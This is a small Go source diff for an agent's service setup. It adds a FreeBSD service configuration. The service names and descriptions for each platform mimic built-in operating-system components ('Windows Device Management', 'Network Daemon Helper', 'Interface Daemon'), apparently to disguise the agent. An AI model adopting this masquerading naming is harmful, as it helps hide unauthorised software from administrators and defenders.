@@ -1,4 +1,4 @@
-// This defines the setup of the agent as a system service.
+// This defines the setup of the agent as a system service (not freebsd).
 // The logic is separated to allow for running the executable
 // standalone as well as as a service
 package main
@@ -19,7 +19,12 @@ func getServiceConfig() *service.Config {
 		svcName = "SystemBroker"
 		svcDisplayName = "Windows Device Management"
 		svcDesc = "Provides device configuration and policy synchronization."
-	// Linux config
+	// FreeBSD config
+	case "freebsd":
+		svcName = "ifd"
+		svcDisplayName = "Interface Daemon"
+		svcDesc = "Used to configure and run network interfaces."
+	// Unix config
 	default:
 		svcName = "networkd-helper"
 		svcDisplayName = "Network Daemon Helper"
